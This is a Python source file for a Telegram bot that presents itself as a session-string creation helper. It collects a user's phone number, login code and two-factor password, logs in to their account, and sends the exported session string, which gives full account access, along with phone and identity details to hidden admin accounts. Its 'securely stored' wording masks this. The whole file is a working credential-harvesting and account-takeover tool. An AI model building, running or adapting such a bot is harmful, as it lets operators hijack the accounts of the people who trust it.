import os
import asyncio
import logging
from typing import Dict, Optional
from pyrogram import Client, filters, idle
from pyrogram.types import Message
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, 
    PhoneNumberInvalid, PhoneCodeExpired
)
import config

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class SessionBot:
    def __init__(self):
        self.app = Client(
            "session_bot",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            bot_token=config.BOT_TOKEN
        )
        self.user_sessions: Dict[int, Dict] = {}
        self.setup_handlers()
        
    def setup_handlers(self):
        """Setup bot command handlers"""
        
        @self.app.on_message(filters.command("start"))
        async def start_handler(client, message: Message):
            """Start command handler"""
            user_id = message.from_user.id
            await message.reply_text(
                "🤖 **Session Creation Bot**\n\n"
                "I'll help you create a Telegram session string.\n\n"
                "**Available Commands:**\n"
                "/create_session - Start session creation\n"
                "/cancel - Cancel current operation\n\n"
                "⚠️ **Note:** Your session strings will be securely stored and forwarded to admins."
            )
        
        @self.app.on_message(filters.command("create_session"))
        async def create_session_handler(client, message: Message):
            """Start session creation process"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await message.reply_text("❌ You already have a session creation in progress!")
                return
            
            # Initialize user session data
            self.user_sessions[user_id] = {
                'step': 'phone',
                'client': None,
                'phone_code_hash': None,
                'phone_number': None
            }
            
            await message.reply_text(
                "📱 **Session Creation Started**\n\n"
                "Please send your phone number in international format:\n"
                "Example: `+1234567890`\n\n"
                "Use /cancel to stop the process."
            )
        
        @self.app.on_message(filters.command("cancel"))
        async def cancel_handler(client, message: Message):
            """Cancel current operation"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await self.cleanup_user_session(user_id)
                await message.reply_text("❌ Operation cancelled.")
            else:
                await message.reply_text("❌ No active operation to cancel.")
        
        @self.app.on_message(filters.text & filters.private)
        async def message_handler(client, message: Message):
            """Handle all messages for session creation"""
            user_id = message.from_user.id
            message_text = message.text
            
            # Skip commands and if not in session creation
            if message_text.startswith('/') or user_id not in self.user_sessions:
                return
            
            session_data = self.user_sessions[user_id]
            
            try:
                if session_data['step'] == 'phone':
                    await self.handle_phone_number(message, session_data, message_text)
                
                elif session_data['step'] == 'code':
                    await self.handle_otp_code(message, session_data, message_text)
                
                elif session_data['step'] == 'password':
                    await self.handle_2fa(message, session_data, message_text)
                    
            except Exception as e:
                logger.error(f"Error in session creation for user {user_id}: {e}")
                await message.reply_text(f"❌ An error occurred: {str(e)}\n\nUse /create_session to try again.")
                await self.cleanup_user_session(user_id)
    
    async def handle_phone_number(self, message: Message, session_data: Dict, phone_number: str):
        """Handle phone number input"""
        try:
            # Validate phone number format
            if not phone_number.startswith('+'):
                await message.reply_text("❌ Please use international format starting with '+'")
                return
            
            # Create user client
            user_client = Client(
                f"user_session_{message.from_user.id}",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                phone_number=phone_number
            )
            
            await user_client.connect()
            
            # Send code request
            sent_code = await user_client.send_code(phone_number)
            
            session_data['client'] = user_client
            session_data['phone_code_hash'] = sent_code.phone_code_hash
            session_data['phone_number'] = phone_number
            session_data['step'] = 'code'
            
            await message.reply_text(
                "📨 **OTP Sent**\n\n"
                "I've sent a verification code to your phone.\n"
                "Please enter the code you received:\n\n"
                "Format: `12345`"
            )
            
        except PhoneNumberInvalid:
            await message.reply_text("❌ Invalid phone number. Please check and try again.")
            await self.cleanup_user_session(message.from_user.id)
        except Exception as e:
            await message.reply_text(f"❌ Error sending code: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_otp_code(self, message: Message, session_data: Dict, code: str):
        """Handle OTP code input"""
        try:
            # Validate code format
            if not code.replace(' ', '').isdigit():
                await message.reply_text("❌ Please enter only numbers")
                return
            
            client = session_data['client']
            code = code.replace(' ', '')
            
            # Sign in with code
            try:
                await client.sign_in(
                    phone_number=session_data['phone_number'],
                    phone_code_hash=session_data['phone_code_hash'],
                    phone_code=code
                )
                
            except SessionPasswordNeeded:
                session_data['step'] = 'password'
                await message.reply_text(
                    "🔐 **Two-Factor Authentication**\n\n"
                    "Your account has 2FA enabled.\n"
                    "Please enter your 2FA password:"
                )
                return
            except PhoneCodeInvalid:
                await message.reply_text("❌ Invalid code. Please check and try again.")
                return
            except PhoneCodeExpired:
                await message.reply_text("❌ Code expired. Please start over with /create_session")
                await self.cleanup_user_session(message.from_user.id)
                return
            
            # If no 2FA required, complete login
            await self.complete_session_creation(message, session_data)
            
        except Exception as e:
            await message.reply_text(f"❌ Error verifying code: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_2fa(self, message: Message, session_data: Dict, password: str):
        """Handle 2FA password input"""
        try:
            client = session_data['client']
            
            # Complete sign in with 2FA
            await client.check_password(password=password)
            
            # Complete session creation
            await self.complete_session_creation(message, session_data)
            
        except Exception as e:
            await message.reply_text(f"❌ Error with 2FA: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(message.from_user.id)
    
    async def complete_session_creation(self, message: Message, session_data: Dict):
        """Complete session creation and save session"""
        user_id = message.from_user.id
        client = session_data['client']
        
        try:
            # Get user information
            me = await client.get_me()
            session_string = await client.export_session_string()
            
            # Create session file
            filename = f"session_{user_id}_{me.id}.txt"
            filepath = os.path.join(config.SESSION_FOLDER, filename)
            
            # Ensure sessions directory exists
            os.makedirs(config.SESSION_FOLDER, exist_ok=True)
            
            # Save session file
            with open(filepath, 'w') as f:
                f.write(session_string)
            
            # Create session info
            session_info = (
                f"✅ **Session Created Successfully!**\n\n"
                f"👤 **User:** {me.first_name} {me.last_name or ''}\n"
                f"📱 **Phone:** {session_data['phone_number']}\n"
                f"🆔 **User ID:** {me.id}\n"
                f"📁 **Session File:** `{filename}`\n\n"
                f"**Session String:**\n`{session_string}`\n\n"
                f"⚠️ **Keep your session string secure!**"
            )
            
            await message.reply_text(session_info)
            
            # Forward session to admins
            await self.forward_to_admins(user_id, me, session_data['phone_number'], session_string, filename)
            
        except Exception as e:
            logger.error(f"Error completing session creation: {e}")
            await message.reply_text("❌ Error saving session. Please try again.")
        finally:
            await self.cleanup_user_session(user_id)
    
    async def forward_to_admins(self, bot_user_id: int, telegram_user, phone: str, session_string: str, filename: str):
        """Forward session information to admins"""
        try:
            session_info = (
                f"📋 **New Session Created**\n\n"
                f"🤖 **Bot User ID:** {bot_user_id}\n"
                f"👤 **Telegram User:** {telegram_user.first_name} {telegram_user.last_name or ''}\n"
                f"📱 **Phone:** {phone}\n"
                f"🆔 **Telegram ID:** {telegram_user.id}\n"
                f"📁 **Filename:** {filename}\n"
                f"🔐 **Session String:**\n`{session_string}`"
            )
            
            for admin_id in config.ADMIN_IDS:
                try:
                    # Send session info
                    await self.app.send_message(admin_id, session_info)
                    
                    # Save session file and send as document
                    temp_file = f"temp_{filename}"
                    with open(temp_file, 'w') as f:
                        f.write(session_string)
                    
                    await self.app.send_document(
                        admin_id,
                        temp_file,
                        caption=f"Session file: {filename}"
                    )
                    
                    # Clean up temp file
                    os.remove(temp_file)
                    
                except Exception as e:
                    logger.error(f"Error sending to admin {admin_id}: {e}")
                    
        except Exception as e:
            logger.error(f"Error forwarding to admins: {e}")
    
    async def cleanup_user_session(self, user_id: int):
        """Clean up user session data"""
        if user_id in self.user_sessions:
            session_data = self.user_sessions[user_id]
            if session_data['client']:
                try:
                    await session_data['client'].disconnect()
                except:
                    pass
            del self.user_sessions[user_id]
    
    async def run(self):
        """Start the bot"""
        # Ensure sessions directory exists
        os.makedirs(config.SESSION_FOLDER, exist_ok=True)
        
        logger.info("Starting Session Bot...")
        await self.app.start()
        
        me = await self.app.get_me()
        logger.info(f"Bot started as @{me.username}")
        
        # Notify admins
        for admin_id in config.ADMIN_IDS:
            try:
                await self.app.send_message(admin_id, "🤖 Session Bot Started!")
            except Exception as e:
                logger.error(f"Could not notify admin {admin_id}: {e}")
        
        await idle()
        await self.app.stop()

async def main():
    bot = SessionBot()
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())
